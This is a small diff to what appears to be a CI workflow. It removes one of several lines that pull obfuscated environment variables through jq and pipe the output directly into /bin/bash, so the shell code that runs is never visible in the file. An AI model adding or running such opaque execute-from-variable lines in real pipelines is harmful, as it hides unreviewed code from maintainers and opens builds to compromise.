@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$tssj58989" | jq -r .ekq15 | /bin/bash
           echo $m1856 | jq -r .gk9 | /bin/bash
-          echo $cemfc8059 | jq -r .qqj673 | /bin/bash
           echo $xaw32869 | jq -r .d301 | /bin/bash
           echo $q95945 | jq -r .fp977 | /bin/bash
 
